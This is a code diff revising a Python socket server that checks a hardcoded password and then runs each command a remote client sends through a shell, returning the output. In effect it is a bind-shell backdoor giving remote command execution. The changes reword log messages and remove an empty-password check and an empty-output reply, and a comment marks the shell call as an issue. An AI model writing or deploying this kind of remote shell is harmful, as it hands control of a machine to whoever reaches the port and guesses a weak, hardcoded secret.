@@ -8,10 +8,8 @@ PASSWORD = "iloveboosters"
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((HOST, PORT))
 
-
 def login():
-    print('Server Started')
-    print('Listening for Client Connection...')
+    print('Server running, listening for connection')
     server.listen(1)
 
     global client, client_addr
@@ -20,65 +18,48 @@ def login():
 
     try:
         password = client.recv(1024).strip()
-
-        if len(password) == 0:
-            print('Failed Login')
-            client.close()
-            return False
-
-        print('Password attempt:', password)
+        print('Client input:', password)
 
         if password == PASSWORD:
-            print('Login Success')
+            print('Login successful')
             return True
         else:
-            print('Failed Login')
+            print('Login failed')
             client.close()
             return False
 
     except Exception as e:
-        print('Login Exception:', e)
+        print('Login exception:', e)
         client.close()
         return False
-
 
 login_status = False
 while not login_status:
     login_status = login()
 
-
 while True:
     try:
-        print('Awaiting Command')
+        print('Waiting for client command')
+        client_cmd = client.recv(1024).strip()
 
-        command = client.recv(1024).strip()
-
-        if not command:
+        if not client_cmd:
             raise Exception("Client disconnected")
 
-        if command == 'exit':
+        if client_cmd.lower() == 'exit':
             client.close()
             break
 
-        op = subprocess.Popen(
-            command,
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
-        )
-
+        # process command as if client was typing into shell locally - ISSUE
+        op = subprocess.Popen(client_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         output, error = op.communicate()
-
         result = output + error
 
-        if len(result) == 0:
-            client.send('no stdout')
-        else:
-            client.send(result)
+        client.send(result)
 
     except Exception as e:
-        print('Main Loop Exception:', e)
+        print('Client cmd exception:', e)
 
+        # Auto log out
         login_status = False
         while not login_status:
             login_status = login()
